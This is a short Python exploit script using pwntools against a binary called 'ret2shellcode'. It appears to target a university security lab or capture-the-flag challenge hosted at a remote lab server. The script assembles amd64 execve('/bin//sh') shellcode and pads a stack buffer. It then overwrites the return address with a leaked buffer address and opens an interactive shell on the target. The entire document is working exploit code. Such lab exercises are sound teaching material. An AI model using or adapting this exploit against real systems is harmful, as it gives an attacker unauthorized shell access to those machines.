from pwn import *
import struct

local = False
elf = 'ret2shellcode' 

if local: 
    print('./'+elf)
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6002
    r = remote(ip,port)

context.arch = 'amd64'
context.os= 'linux'
#addr =
shellcode = "nop;nop;xor rax, rax;mov rbx, 0x68732f2f6e69622f;push rax;push rbx;mov rdi, rsp;push rax;push rdi;mov rsi, rsp;xor rdx,rdx;mov al,0x3b;syscall"
payload = asm(shellcode)
payload += p64(0x0)*23

print(r.recvuntil("address:"))
buffer_addr = r.recvuntil("\n")
print(buffer_addr[1:-1])
payload += p64(int(buffer_addr[:-1],16))
print(payload)
print(len(payload))
r.recvuntil("Input:")
r.send(payload)
#r.sendline(payload)

r.interactive()
